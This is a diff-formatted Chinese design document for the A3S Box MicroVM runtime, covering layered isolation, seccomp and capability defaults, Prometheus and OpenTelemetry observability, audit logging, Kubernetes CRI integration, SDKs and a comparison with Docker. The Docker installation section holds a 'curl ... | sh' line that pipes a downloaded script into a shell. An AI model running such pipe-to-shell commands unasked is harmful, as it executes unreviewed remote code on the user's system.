+A3S Box 实现了七层纵深防御，每一层都独立地增加攻击成本：
+
+### 16.2 第一层：硬件虚拟化隔离
+
+这是最外层也是最强的隔离。每个 MicroVM 运行在独立的硬件虚拟化域中（Intel VT-x / AMD-V / Apple HVF）。处理器在硬件层面区分宿主模式和客户模式，任何敏感操作都会触发 VM Exit。
+
+攻击者即使在 MicroVM 内部获得了 root 权限并利用了 Linux 内核漏洞，也只能影响该 MicroVM 自身——因为内核漏洞无法突破硬件虚拟化边界。
+
+### 16.3 第二层：内存加密（TEE）
+
+在支持 AMD SEV-SNP 或 Intel TDX 的硬件上，MicroVM 的内存被硬件加密。每个 VM 拥有独立的 AES 加密密钥，由处理器的安全处理器管理。即使攻击者拥有宿主机的物理访问权限（包括冷启动攻击、DMA 攻击），也无法读取 VM 内存的明文。
+
+这一层将威胁模型从"信任宿主机"扩展到"不信任任何人"——只信任硬件。
+
+### 16.4 第三层：独立内核
+
+每个 MicroVM 运行自己的 Linux 内核。这意味着：
+
+- 一个 MicroVM 中的内核漏洞不会影响其他 MicroVM
+- 内核配置可以针对工作负载优化（最小化攻击面）
+- 内核版本可以独立更新，不影响其他工作负载
+
+### 16.5 第四层：命名空间隔离
+
+在 MicroVM 内部，容器进程通过 Linux 命名空间进一步隔离。默认启用 Mount、PID、IPC、UTS 四种命名空间。这一层的意义在于：即使 MicroVM 内部运行了多个进程，它们之间也有操作系统级的隔离。
+
+### 16.6 第五层：Capability 剥离
+
+Linux Capability 机制将 root 的全权拆分为 41 个细粒度能力。A3S Box 默认剥离所有 Capability，只保留应用明确需要的能力。这遵循了最小权限原则——进程只拥有完成其任务所需的最小权限集。
+
+### 16.7 第六层：Seccomp BPF 系统调用过滤
+
+即使进程拥有某些 Capability，Seccomp BPF 过滤器仍然可以阻止特定的系统调用。A3S Box 默认阻止 16 个危险的系统调用（如 `kexec_load`、`bpf`、`perf_event_open`），并验证系统调用的架构（防止 32 位兼容模式绕过）。
+
+### 16.8 第七层：no-new-privileges
+
+`PR_SET_NO_NEW_PRIVS` 标志确保进程及其所有后代无法通过 `execve()` 获得新的特权。这防止了通过执行 SUID/SGID 二进制来提升权限的攻击路径。
+
+### 16.9 安全配置的传递
+
+安全配置从宿主机传递到 Guest Init 通过一组环境变量：
+
+| 环境变量                 | 说明              | 示例                         |
+| ------------------------ | ----------------- | ---------------------------- |
+| `A3S_SEC_SECCOMP`      | Seccomp 模式      | `default` / `unconfined` |
+| `A3S_SEC_NO_NEW_PRIVS` | no-new-privileges | `1` / `0`                |
+| `A3S_SEC_PRIVILEGED`   | 特权模式          | `1` / `0`                |
+| `A3S_SEC_CAP_ADD`      | 添加的 Capability | `NET_ADMIN,SYS_TIME`       |
+| `A3S_SEC_CAP_DROP`     | 移除的 Capability | `ALL`                      |
+
+特权模式（`--privileged`）会同时设置 `seccomp=unconfined`、`no_new_privileges=false`、`cap_add=ALL`——这应该仅在开发和调试时使用，生产环境中强烈不建议。
+
+### 16.10 攻击路径分析
+
+让我们分析一个假设的攻击场景，看看七层防御如何协同工作：
+
+```
+攻击者目标：从 MicroVM A 读取 MicroVM B 的内存数据
+
+Step 1: 攻击者在 MicroVM A 中获得应用级代码执行
+        → 面对第七层 (no-new-privileges)：无法提升权限
+        → 面对第六层 (Seccomp)：危险系统调用被阻止
+        → 面对第五层 (Capabilities)：缺少必要的能力
+
+Step 2: 假设攻击者绕过了应用层防御，获得了 root 权限
+        → 面对第四层 (Namespace)：只能看到自己的进程和文件系统
+        → 面对第三层 (独立内核)：内核漏洞只影响自己的 VM
+
+Step 3: 假设攻击者利用了内核漏洞
+        → 面对第一层 (硬件虚拟化)：VM Exit 机制阻止跨 VM 访问
+        → 无法读取 MicroVM B 的内存
+
+Step 4: 假设攻击者甚至突破了虚拟化层（极其罕见）
+        → 面对第二层 (TEE 内存加密)：MicroVM B 的内存是加密的
+        → 即使读取到原始内存数据，也只是密文
+
+结论：攻击者需要同时突破所有七层才能达成目标。
+      每一层都是独立的，突破一层不会降低其他层的防御强度。
+```
+
+---
+
+## 17. 可观测性：Prometheus、OpenTelemetry 与审计
+
+### 17.1 可观测性的三大支柱
+
+在生产环境中运行 MicroVM 集群，可观测性是不可或缺的。A3S Box 实现了可观测性的三大支柱：指标（Metrics）、追踪（Tracing）和审计（Auditing）。
+
+### 17.2 Prometheus 指标
+
+`RuntimeMetrics` 实现了 `MetricsCollector` trait，通过 Prometheus 客户端库暴露以下指标：
+
+**VM 生命周期指标：**
+
+| 指标名                 | 类型      | 说明                 |
+| ---------------------- | --------- | -------------------- |
+| `vm_boot_duration`   | Histogram | VM 启动耗时分布      |
+| `vm_created_total`   | Counter   | VM 创建总数          |
+| `vm_destroyed_total` | Counter   | VM 销毁总数          |
+| `vm_count`           | Gauge     | 当前运行中的 VM 数量 |
+
+**命令执行指标：**
+
+| 指标名                | 类型      | 说明             |
+| --------------------- | --------- | ---------------- |
+| `exec_total`        | Counter   | 执行命令总数     |
+| `exec_duration`     | Histogram | 命令执行耗时分布 |
+| `exec_errors_total` | Counter   | 执行错误总数     |
+
+**VM 级别指标：**
+
+每个 VM 还暴露实时的资源使用指标：
+
+```rust
+pub struct VmMetrics {
+    pub cpu_percent: Option<f32>,    // CPU 使用率
+    pub memory_bytes: Option<u64>,   // 内存使用量
+}
+```
+
+这些指标通过 `sysinfo` 库从宿主机的 `/proc` 文件系统采集，反映 shim 子进程（即 VM）的实际资源消耗。
+
+### 17.3 OpenTelemetry 分布式追踪
+
+A3S Box 集成了 OpenTelemetry SDK，为关键操作生成分布式追踪 span。这使得运维人员可以追踪一个请求从 CLI 到 runtime 到 shim 到 Guest Init 的完整链路。
+
+典型的追踪链路：
+
+```
+[a3s-box run nginx]
+  └── [runtime.create_vm]
+       ├── [oci.pull_image]
+       │    ├── [registry.authenticate]
+       │    ├── [registry.pull_manifest]
+       │    └── [registry.pull_layers]
+       ├── [rootfs.build]
+       ├── [vm.start]
+       │    ├── [shim.spawn]
+       │    └── [shim.wait_ready]
+       └── [vm.configure_network]
+```
+
+追踪数据可以导出到 SigNoz、Jaeger 或任何兼容 OTLP 协议的后端。
+
+### 17.4 审计日志系统
+
+审计日志是安全合规的关键组件。A3S Box 的审计系统基于 W7 模型（Who, What, When, Where, Why, How, Outcome），记录所有安全相关的操作。
+
+`AuditEvent` 结构：
+
+```rust
+pub struct AuditEvent {
+    pub id: String,                          // 唯一事件 ID
+    pub timestamp: DateTime<Utc>,            // 时间戳
+    pub action: AuditAction,                 // 操作类型
+    pub box_id: Option<String>,              // 关联的 MicroVM ID
+    pub actor: Option<String>,               // 操作者
+    pub outcome: AuditOutcome,               // 结果
+    pub message: Option<String>,             // 描述信息
+    pub metadata: HashMap<String, String>,   // 附加元数据
+}
+```
+
+### 17.5 审计操作分类
+
+A3S Box 定义了 26 种审计操作，覆盖七个类别：
+
+| 类别         | 操作                                                                   | 说明                                        |
+| ------------ | ---------------------------------------------------------------------- | ------------------------------------------- |
+| Box 生命周期 | Create, Start, Stop, Destroy, Restart                                  | VM 的创建、启动、停止、销毁、重启           |
+| 执行         | Command, Attach                                                        | 命令执行、终端附加                          |
+| 镜像         | Pull, Push, Build, Delete                                              | 镜像拉取、推送、构建、删除                  |
+| 网络         | Create, Delete, Connect, Disconnect                                    | 网络创建、删除、连接、断开                  |
+| 卷           | Create, Delete                                                         | 卷创建、删除                                |
+| 安全         | SignatureVerify, AttestationVerify, SecretInject, SealData, UnsealData | 签名验证、证明验证、密钥注入、数据密封/解封 |
+| 认证         | RegistryLogin, Logout                                                  | 注册表登录、登出                            |
+| 系统         | Prune, ConfigChange                                                    | 清理、配置变更                              |
+
+每个审计事件的结果（`AuditOutcome`）为三种之一：`Success`、`Failure`、`Denied`。
+
+### 17.6 审计日志配置
+
+```rust
+pub struct AuditConfig {
+    pub enabled: bool,       // 默认 true
+    pub max_size: u64,       // 单文件最大大小，默认 50 MB
+    pub max_files: u32,      // 最大文件数量，默认 10
+}
+```
+
+审计日志以 JSON-lines 格式写入，支持日志轮转。当单个文件达到 `max_size` 时自动轮转，最多保留 `max_files` 个历史文件。总审计存储上限为 `max_size × max_files`（默认 500 MB）。
+
+用户可以通过 CLI 查询审计日志：
+
+```bash
+# 查看所有审计事件
+a3s-box audit
+
+# 按操作类型过滤
+a3s-box audit --filter "action=exec"
+
+# 按 MicroVM 过滤
+a3s-box audit --filter "box_id=my-app"
+
+# 按时间范围过滤
+a3s-box audit --since "2024-01-01T00:00:00Z"
+```
+
+### 17.7 自定义审计后端
+
+`AuditSink` trait 允许用户实现自定义的审计事件持久化后端：
+
+```rust
+pub trait AuditSink: Send + Sync {
+    fn write(&self, event: &AuditEvent) -> Result<()>;
+    fn flush(&self) -> Result<()>;
+}
+```
+
+默认实现将事件写入 JSON-lines 文件。用户可以实现自己的 `AuditSink` 将事件发送到 Elasticsearch、Splunk、CloudWatch Logs 或任何其他日志聚合系统。
+
+---
+
+## 18. Kubernetes 集成：CRI 运行时
+
+### 18.1 CRI 的角色
+
+CRI（Container Runtime Interface）是 Kubernetes 定义的标准接口，用于 kubelet 与容器运行时之间的通信。通过实现 CRI，A3S Box 可以作为 Kubernetes 的 RuntimeClass 运行——这意味着 Kubernetes 集群中的 Pod 可以选择在 A3S Box 的 MicroVM 中运行，而不是传统的 runc 容器中。
+
+```
+kubelet
+  │
+  ├── RuntimeClass: runc (默认)
+  │   └── 传统容器（共享内核）
+  │
+  └── RuntimeClass: a3s-box
+      └── MicroVM（独立内核 + 可选 TEE）
+```
+
+### 18.2 BoxAutoscaler CRD
+
+A3S Box 定义了自定义资源 `BoxAutoscaler`（API Group: `box.a3s.dev`，版本: `v1alpha1`），用于在 Kubernetes 中实现 MicroVM 的自动扩缩容：
+
+```yaml
+apiVersion: box.a3s.dev/v1alpha1
+kind: BoxAutoscaler
+metadata:
+  name: my-service-autoscaler
+spec:
+  targetRef:
+    apiVersion: box.a3s.dev/v1alpha1
+    kind: BoxDeployment
+    name: my-service
+  minReplicas: 1
+  maxReplicas: 10
+  metrics:
+    - type: Cpu
+      target: 70          # CPU 使用率目标 70%
+    - type: Memory
+      target: 80          # 内存使用率目标 80%
+    - type: Rps
+      target: 1000        # 每秒请求数目标
+    - type: Inflight
+      target: 50          # 并发请求数目标
+  behavior:
+    scaleUp:
+      stabilizationWindowSeconds: 60
+      policies:
+        - type: Pods
+          value: 3
+          periodSeconds: 60    # 每分钟最多扩容 3 个
+    scaleDown:
+      stabilizationWindowSeconds: 300
+      policies:
+        - type: Pods
+          value: 1
+          periodSeconds: 60    # 每分钟最多缩容 1 个
+  cooldownSecs: 60
+```
+
+### 18.3 指标类型
+
+BoxAutoscaler 支持五种指标类型：
+
+| 指标类型     | 说明                          | 典型目标值 |
+| ------------ | ----------------------------- | ---------- |
+| `Cpu`      | CPU 使用率百分比              | 70%        |
+| `Memory`   | 内存使用率百分比              | 80%        |
+| `Inflight` | 当前并发请求数                | 50         |
+| `Rps`      | 每秒请求数                    | 1000       |
+| `Custom`   | 自定义指标（Prometheus 查询） | 视场景而定 |
+
+### 18.4 实例生命周期
+
+在 Kubernetes 集成中，每个 MicroVM 实例经历以下状态转换：
+
+```
+Creating → Booting → Ready → Busy → Draining → Stopping → Stopped
+                       ↑       │
+                       └───────┘
+                                         ↓ (异常)
+                                       Failed
+```
+
+各状态含义：
+
+- **Creating**：实例配置已生成，资源正在分配
+- **Booting**：MicroVM 正在启动（内核引导、Guest Init 初始化）
+- **Ready**：实例就绪，可以接收流量
+- **Busy**：实例正在处理请求
+- **Draining**：实例正在排空现有请求（缩容前的优雅过渡）
+- **Stopping**：实例正在关闭
+- **Stopped**：实例已停止
+- **Failed**：实例异常终止
+
+### 18.5 Scale API
+
+`ScaleRequest` 和 `ScaleResponse` 定义了扩缩容的请求/响应协议：
+
+```rust
+pub struct ScaleRequest {
+    pub service: String,
+    pub replicas: u32,
+    pub config: ScaleConfig,    // image, vcpus, memory_mib, env, port_map
+    pub request_id: String,
+}
+
+pub struct ScaleResponse {
+    pub request_id: String,
+    pub accepted: bool,
+    pub current_replicas: u32,
+    pub target_replicas: u32,
+    pub instances: Vec<InstanceInfo>,
+    pub error: Option<String>,
+}
+```
+
+### 18.6 实例健康检查
+
+每个实例持续报告健康状态：
+
+```rust
+pub struct InstanceHealth {
+    pub cpu_percent: f32,
+    pub memory_bytes: u64,
+    pub inflight_requests: u32,
+    pub healthy: bool,
+}
+```
+
+健康检查数据同时用于：
+
+- BoxAutoscaler 的扩缩容决策
+- 负载均衡器的流量分配
+- 告警系统的异常检测
+
+### 18.7 Gateway 自注册
+
+MicroVM 实例启动后，通过 `InstanceRegistration` 向 A3S Gateway 自注册：
+
+```rust
+pub struct InstanceRegistration {
+    pub instance_id: String,
+    pub service: String,
+    pub endpoint: String,       // 实例的访问地址
+    pub health: InstanceHealth,
+    pub metadata: HashMap<String, String>,
+}
+```
+
+当实例停止时，发送 `InstanceDeregistration` 取消注册。这种自注册机制使得 Gateway 可以自动发现和路由到新的实例，无需手动配置。
+
+---
+
+## 19. SDK 生态：Rust、Python、TypeScript 三端统一
+
+### 19.1 SDK 架构
+
+A3S Box 的 SDK 采用"一次实现，多端绑定"的架构：
+
+```
+┌─────────────────────────────────────────┐
+│              a3s-box-sdk (Rust)          │
+│         核心实现：BoxSdk + BoxSandbox     │
+├──────────┬──────────────┬───────────────┤
+│  Rust    │   Python     │  TypeScript   │
+│  原生 API │  PyO3 绑定   │  napi-rs 绑定 │
+│          │  (async)     │  (async)      │
+└──────────┴──────────────┴───────────────┘
+```
+
+核心逻辑只用 Rust 实现一次，然后通过 PyO3（Python）和 napi-rs（TypeScript/Node.js）生成原生绑定。这确保了三端 SDK 的行为完全一致，同时享受 Rust 的性能和安全性。
+
+### 19.2 Rust SDK
+
+Rust SDK 是最底层的接口，提供完整的类型安全和零成本抽象：
+
+```rust
+use a3s_box_sdk::{BoxSdk, SandboxOptions};
+
+#[tokio::main]
+async fn main() -> Result<()> {
+    // 创建 SDK 实例
+    let sdk = BoxSdk::new(None)?;  // None = 使用默认 home_dir
+
+    // 创建沙箱
+    let sandbox = sdk.create(Some(SandboxOptions {
+        image: "python:3.11".to_string(),
+        vcpus: 2,
+        memory_mib: 1024,
+        ..Default::default()
+    })).await?;
+
+    // 执行命令
+    let output = sandbox.exec(&["python", "-c", "print('hello')"]).await?;
+    println!("{}", output.stdout);
+
+    // 沙箱在 drop 时自动清理
+    Ok(())
+}
+```
+
+### 19.3 Python SDK
+
+Python SDK 通过 PyO3 桥接，提供 Pythonic 的异步接口：
+
+```python
+import asyncio
+from a3s_box import BoxSdk, SandboxOptions
+
+async def main():
+    # 创建 SDK 实例
+    sdk = BoxSdk()
+
+    # 创建沙箱
+    sandbox = sdk.create(SandboxOptions(
+        image="python:3.11",
+        vcpus=2,
+        memory_mib=1024,
+    ))
+
+    # 执行命令
+    output = sandbox.exec(["python", "-c", "print('hello')"])
+    print(output.stdout)
+
+asyncio.run(main())
+```
+
+PyO3 绑定的关键设计决策：
+
+- 使用 `py.allow_threads` 释放 GIL，确保 Rust 的异步操作不会阻塞 Python 的事件循环
+- 内部维护一个 Tokio Runtime，将 Python 的同步调用桥接到 Rust 的异步世界
+- 类型映射：Rust 的 `Result<T>` → Python 的异常，Rust 的 `Option<T>` → Python 的 `None`
+
+### 19.4 TypeScript SDK
+
+TypeScript SDK 通过 napi-rs 生成原生 Node.js 模块：
+
+```typescript
+import { BoxSdk, SandboxOptions } from '@a3s/box';
+
+async function main() {
+    // 创建 SDK 实例
+    const sdk = new BoxSdk();
+
+    // 创建沙箱
+    const sandbox = await sdk.create({
+        image: 'node:20',
+        vcpus: 2,
+        memoryMib: 1024,
+    });
+
+    // 执行命令
+    const output = await sandbox.exec(['node', '-e', 'console.log("hello")']);
+    console.log(output.stdout);
+}
+
+main();
+```
+
+napi-rs 的优势在于生成的是真正的原生模块（`.node` 文件），而非通过 FFI 或子进程调用。这意味着：
+
+- 零序列化开销（直接在 V8 堆和 Rust 堆之间传递数据）
+- 完整的 TypeScript 类型定义（自动生成 `.d.ts`）
+- 支持 async/await（通过 Tokio 和 libuv 的集成）
+
+### 19.5 多平台构建
+
+SDK 的原生绑定需要为每个目标平台单独编译。A3S Box 通过 GitHub Actions CI 矩阵实现多平台构建：
+
+| 平台                          | Python wheels | Node.js 模块 |
+| ----------------------------- | ------------- | ------------ |
+| Linux x86_64                  | ✅ maturin    | ✅ napi-rs   |
+| Linux aarch64                 | ✅ maturin    | ✅ napi-rs   |
+| macOS x86_64                  | ✅ maturin    | ✅ napi-rs   |
+| macOS aarch64 (Apple Silicon) | ✅ maturin    | ✅ napi-rs   |
+
+Python wheels 通过 `maturin` 构建并发布到 PyPI，Node.js 模块通过 `napi-rs` 构建并发布到 npm。用户只需 `pip install a3s-box` 或 `npm install @a3s/box`，包管理器会自动选择正确的平台变体。
+
+---
+
+## 20. 与现有方案的对比分析
+
+### 20.1 容器运行时全景
+
+当前的容器运行时生态可以按隔离强度分为四个层次：
+
+```
+隔离强度 ↑
+         │
+         │  ┌─────────────────────────────────────────┐
+         │  │ A3S Box (TEE 模式)                       │
+         │  │ MicroVM + 内存加密 + 七层纵深防御          │
+         │  └─────────────────────────────────────────┘
+         │  ┌─────────────────────────────────────────┐
+         │  │ A3S Box (标准模式) / Kata Containers      │
+         │  │ MicroVM + 独立内核                        │
+         │  └─────────────────────────────────────────┘
+         │  ┌─────────────────────────────────────────┐
+         │  │ gVisor                                    │
+         │  │ 用户空间内核（系统调用拦截）                 │
+         │  └─────────────────────────────────────────┘
+         │  ┌─────────────────────────────────────────┐
+         │  │ runc (Docker 默认)                        │
+         │  │ 共享内核 + namespace + cgroup              │
+         │  └─────────────────────────────────────────┘
+         │
+         └──────────────────────────────────────────→ 性能开销
+```
+
+### 20.2 详细对比
+
+| 维度                      | runc (Docker)               | gVisor              | Kata Containers            | Firecracker          | A3S Box                 |
+| ------------------------- | --------------------------- | ------------------- | -------------------------- | -------------------- | ----------------------- |
+| **隔离机制**        | namespace + cgroup          | 用户空间内核        | MicroVM (QEMU/CLH)         | MicroVM (KVM)        | MicroVM (libkrun)       |
+| **内核隔离**        | ❌ 共享                     | ⚠️ 部分（Sentry） | ✅ 独立                    | ✅ 独立              | ✅ 独立                 |
+| **冷启动**          | ~50ms                       | ~150ms              | ~500ms-2s                  | ~125ms               | ~200ms                  |
+| **内存开销**        | ~5 MB                       | ~15 MB              | ~30-50 MB                  | ~5 MB                | ~10 MB                  |
+| **TEE 支持**        | ❌                          | ❌                  | ⚠️ 有限                  | ❌                   | ✅ SEV-SNP (TDX 规划中) |
+| **macOS 支持**      | ✅ (Docker Desktop)         | ❌                  | ❌                         | ❌                   | ✅ 原生 HVF             |
+| **Docker CLI 兼容** | ✅ 原生                     | ⚠️ 部分           | ⚠️ 通过 shimv2           | ❌                   | ✅ 52 命令              |
+| **K8s 集成**        | ✅ CRI                      | ✅ CRI              | ✅ CRI                     | ⚠️ containerd-shim | ✅ CRI                  |
+| **语言**            | Go                          | Go                  | Go + Rust                  | Rust                 | Rust                    |
+| **嵌入式 SDK**      | ❌                          | ❌                  | ❌                         | ✅ (Rust)            | ✅ (Rust/Python/TS)     |
+| **审计日志**        | ❌                          | ❌                  | ❌                         | ❌                   | ✅ 26 种操作            |
+| **暖池**            | N/A                         | N/A                 | ❌                         | ❌                   | ✅ 自动扩缩容           |
+| **RA-TLS**          | ❌                          | ❌                  | ❌                         | ❌                   | ✅                      |
+| **密封存储**        | ❌                          | ❌                  | ❌                         | ❌                   | ✅ 三种策略             |
+| **守护进程**        | ✅ 需要 dockerd             | ✅ 需要 runsc       | ✅ 需要 shimv2             | ✅ 需要 firecracker  | ❌ 无守护进程           |
+| **二进制大小**      | ~200 MB (全套)              | ~50 MB              | ~100 MB+                   | ~30 MB               | ~40 MB (单一二进制)     |
+| **依赖组件**        | dockerd + containerd + runc | containerd + runsc  | containerd + shimv2 + QEMU | firecracker + jailer | 单一二进制，零外部依赖  |
+
+### 20.3 A3S Box vs Docker：深度对比
+
+Docker 是容器生态的事实标准，也是大多数开发者最熟悉的工具。将 A3S Box 与 Docker 进行深度对比，有助于理解 A3S Box 的差异化价值。
+
+#### 20.3.1 架构差异：无守护进程 vs 守护进程模型
+
+Docker 采用经典的客户端-服务器架构：
+
+```
+Docker 架构：
+  docker CLI ──→ dockerd (守护进程, 常驻后台)
+                    │
+                    ├── containerd (容器生命周期管理)
+                    │       │
+                    │       └── containerd-shim
+                    │               │
+                    │               └── runc (OCI 运行时)
+                    │                     │
+                    │                     └── 容器进程
+                    │
+                    └── 网络/存储/日志插件
+```
+
+这个架构意味着：
+
+- 必须运行 `dockerd` 守护进程（通常以 root 权限运行）
+- `dockerd` 是单点故障——如果守护进程崩溃，所有容器的管理能力丧失
+- 守护进程本身是一个高价值攻击目标（root 权限 + 控制所有容器）
+- 升级 Docker 需要重启守护进程，可能影响运行中的容器
+
+A3S Box 采用无守护进程架构：
+
+```
+A3S Box 架构：
+  a3s-box CLI ──→ 直接启动 shim 子进程
+                        │
+                        └── libkrun (库调用，非独立进程)
+                                │
+                                └── MicroVM (独立内核)
+                                        │
+                                        └── Guest Init (PID 1)
+                                                │
+                                                └── 应用进程
+```
+
+无守护进程的优势：
+
+- **无单点故障**：每个 MicroVM 由独立的 shim 子进程管理，一个 VM 的管理进程崩溃不影响其他 VM
+- **无特权守护进程**：消除了 Docker 守护进程这个高价值攻击目标
+- **零运维开销**：不需要管理守护进程的启动、监控、日志轮转
+- **即装即用**：无需 `systemctl start docker`，直接执行命令即可
+
+#### 20.3.2 体积对比：40MB vs 200MB+
+
+| 组件           | Docker               | A3S Box                        |
+| -------------- | -------------------- | ------------------------------ |
+| CLI            | docker (~50 MB)      | a3s-box (~40 MB，包含全部功能) |
+| 运行时守护进程 | dockerd (~80 MB)     | 无需                           |
+| 容器管理       | containerd (~50 MB)  | 内置                           |
+| OCI 运行时     | runc (~10 MB)        | 内置（libkrun）                |
+| 网络插件       | CNI plugins (~20 MB) | 内置                           |
+| **总计** | **~200 MB+**   | **~40 MB**               |
+
+A3S Box 将所有功能编译为单一的 Rust 二进制文件，没有外部依赖。这意味着：
+
+- **部署极简**：复制一个文件即完成安装，无需包管理器
+- **版本管理简单**：一个二进制 = 一个版本，不存在组件版本不兼容的问题
+- **离线部署友好**：在无网络的环境中，只需传输一个 40MB 的文件
+- **CI/CD 缓存高效**：缓存一个文件比缓存整个 Docker 安装快得多
+
+#### 20.3.3 安全模型对比
+
+```
+Docker 的隔离边界：
+┌─────────────────────────────────────┐
+│           宿主机 Linux 内核           │  ← 所有容器共享
+│  ┌─────────┐  ┌─────────┐          │
+│  │ 容器 A   │  │ 容器 B   │          │
+│  │ ns+cgroup│  │ ns+cgroup│          │
+│  └─────────┘  └─────────┘          │
+│                                     │
+│  内核漏洞 = 全部容器沦陷              │
+└─────────────────────────────────────┘
+
+A3S Box 的隔离边界：
+┌─────────────────────────────────────┐
+│           宿主机 Linux 内核           │
+│  ┌──────────────┐  ┌──────────────┐ │
+│  │ MicroVM A     │  │ MicroVM B     │ │
+│  │ ┌──────────┐ │  │ ┌──────────┐ │ │
+│  │ │独立内核   │ │  │ │独立内核   │ │ │
+│  │ │ 应用进程  │ │  │ │ 应用进程  │ │ │
+│  │ └──────────┘ │  │ └──────────┘ │ │
+│  │ 硬件虚拟化边界│  │ 硬件虚拟化边界│ │
+│  └──────────────┘  └──────────────┘ │
+│                                     │
+│  VM A 的内核漏洞 ≠ VM B 受影响       │
+└─────────────────────────────────────┘
+```
+
+关键安全差异：
+
+| 安全维度          | Docker                       | A3S Box                         |
+| ----------------- | ---------------------------- | ------------------------------- |
+| 内核共享          | 所有容器共享宿主内核         | 每个 VM 独立内核                |
+| 逃逸影响          | 一个容器逃逸 → 控制所有容器 | 一个 VM 逃逸 → 仅影响该 VM     |
+| 特权守护进程      | dockerd 以 root 运行         | 无守护进程                      |
+| 内存加密          | ❌                           | ✅ TEE (SEV-SNP)                |
+| 远程证明          | ❌                           | ✅ RA-TLS                       |
+| 审计日志          | 基础（Docker events）        | 完整（26 种操作，W7 模型）      |
+| Seccomp 默认      | 允许 ~300 个系统调用         | 仅阻止 16 个危险调用 + 架构验证 |
+| 默认 Capabilities | 保留 14 个                   | 全部剥离                        |
+
+#### 20.3.4 启动速度对比
+
+```
+Docker 容器启动（~50ms）：
+  [0ms]  dockerd 接收请求
+  [5ms]  containerd 创建容器
+  [10ms] runc 设置 namespace + cgroup
+  [20ms] pivot_root 切换根文件系统
+  [30ms] 应用进程启动
+  [50ms] 就绪
+
+A3S Box MicroVM 启动（~200ms）：
+  [0ms]   CLI 接收请求
+  [20ms]  启动 shim 子进程
+  [50ms]  libkrun 创建 VM + 内核引导
+  [150ms] Guest Init 挂载文件系统
+  [180ms] 配置网络 + 启动 vsock 服务器
+  [200ms] 就绪
+
+A3S Box 暖池模式（~0ms）：
+  [0ms]   CLI 接收请求
+  [0ms]   从暖池获取已就绪的 VM
+  [0ms]   就绪
+```
+
+Docker 的启动速度确实更快（~50ms vs ~200ms），但这 150ms 的差距换来的是：
+
+- 从共享内核隔离升级到硬件虚拟化隔离
+- 可选的 TEE 内存加密
+- 独立内核（内核漏洞不扩散）
+
+对于延迟敏感的场景，暖池机制可以将有效启动时间降到接近零。
+
+#### 20.3.5 开发体验对比
+
+| 维度       | Docker                                                        | A3S Box                         |
+| ---------- | ------------------------------------------------------------- | ------------------------------- |
+| 安装       | 需要安装 Docker Desktop（macOS/Windows）或 docker-ce（Linux） | 下载单一二进制，无需安装        |
+| macOS 支持 | 通过 Docker Desktop（需要 HyperKit/VZ 虚拟化层）              | 原生 Apple HVF，无中间层        |
+| 命令兼容   | 原生                                                          | 52 个兼容命令，语法一致         |
+| Dockerfile | 原生支持                                                      | 兼容 OCI 镜像格式               |
+| SDK 嵌入   | 需要通过 Docker API（HTTP REST）                              | 原生 Rust/Python/TypeScript SDK |
+| 资源占用   | Docker Desktop 常驻内存 ~1-2 GB                               | 无常驻进程，按需启动            |
+| 许可证     | Docker Desktop 商业使用需付费                                 | MIT 开源                        |
+
+对于开发者来说，从 Docker 迁移到 A3S Box 的成本极低：
+
+```bash
+# 迁移前
+docker run -d --name web -p 8080:80 nginx
+docker exec web curl localhost
+docker logs web
+docker stop web && docker rm web
+
+# 迁移后（只需替换命令名）
+a3s-box run -d --name web -p 8080:80 nginx
+a3s-box exec web curl localhost
+a3s-box logs web
+a3s-box stop web && a3s-box rm web
+```
+
+#### 20.3.6 安装方式对比
+
+Docker 的安装因平台而异，通常需要多个步骤：
+
+```bash
+# Docker on macOS — 需要下载 ~1GB 的 Docker Desktop 安装包
+# 1. 下载 Docker Desktop .dmg
+# 2. 拖拽安装
+# 3. 启动 Docker Desktop（常驻后台，占用 1-2 GB 内存）
+# 4. 等待 dockerd 启动完成
+
+# Docker on Linux — 需要配置 apt/yum 源
+curl -fsSL https://get.docker.com | sh
+sudo systemctl enable --now docker
+sudo usermod -aG docker $USER
+# 需要重新登录 shell 才能生效
+```
+
+A3S Box 提供了多种轻量级安装方式，每一种都在秒级完成：
+
+```bash
+# 方式一：Homebrew（macOS / Linux）
+brew tap A3S-Lab/homebrew-tap https://github.com/A3S-Lab/homebrew-tap.git
+brew install a3s-box
+# 自动从 GitHub Releases 下载预编译二进制
+# 包含 a3s-box CLI + a3s-box-shim + a3s-box-guest-init
+# 完成。无守护进程，无需重启，立即可用。
+
+# 方式二：Cargo（Rust 开发者）
+cargo install a3s-box
+# 从源码编译安装，自动获取最新版本
+
+# 方式三：Helm（Kubernetes 集群）
+helm repo add a3s https://a3s-lab.github.io/charts
+helm install a3s-box a3s/a3s-box
+# 在 K8s 集群中部署为 DaemonSet，每个节点自动运行
+
+# 方式四：直接下载二进制（GitHub Releases）
+# macOS Apple Silicon:
+curl -L https://github.com/A3S-Lab/Box/releases/latest/download/a3s-box-latest-macos-arm64.tar.gz | tar xz
+# Linux x86_64:
+curl -L https://github.com/A3S-Lab/Box/releases/latest/download/a3s-box-latest-linux-x86_64.tar.gz | tar xz
+./a3s-box version
+# 解压即用，零依赖
+```
+
+| 安装方式 | 适用场景                  | 安装时间 | 依赖           |
+| -------- | ------------------------- | -------- | -------------- |
+| Homebrew | macOS/Linux 日常开发      | ~10 秒   | Homebrew       |
+| Cargo    | Rust 开发者、需要源码编译 | ~2 分钟  | Rust toolchain |
+| Helm     | Kubernetes 集群部署       | ~30 秒   | Helm + K8s     |
+| 直接下载 | CI/CD、离线环境、边缘设备 | ~5 秒    | 无             |
+
+更多安装细节和配置选项请参考官方文档：[https://a3s-lab.github.io/a3s/](https://a3s-lab.github.io/a3s/)
+
+对比 Docker Desktop 的安装体验（下载 1GB → 安装 → 启动守护进程 → 等待就绪），A3S Box 的安装可以用一个词概括：**即装即用**。
+
+#### 20.3.7 何时选择 Docker，何时选择 A3S Box？
+
+**选择 Docker 的场景：**
+
+- 对启动延迟极度敏感（P99 < 100ms）且不使用暖池
+- 已有深度集成 Docker API 的工具链且迁移成本高
+- 不需要硬件级隔离（如内部开发环境、可信工作负载）
+- 需要 Docker Compose 编排多容器应用
+
+**选择 A3S Box 的场景：**
+
+- 运行不可信代码（AI Agent、用户提交的代码、第三方插件）
+- 多租户环境需要强隔离保证
+- 处理敏感数据需要 TEE 机密计算
+- 需要完整的审计追踪（合规要求）
+- macOS 开发环境不想安装 Docker Desktop
+- 边缘/IoT 部署需要极小的二进制体积
+- 需要将沙箱能力嵌入到应用中（SDK 集成）
+
+### 20.4 场景适用性分析
+
+**场景一：开发与测试环境**
+
+推荐：A3S Box（TSI 模式）或 Docker
+
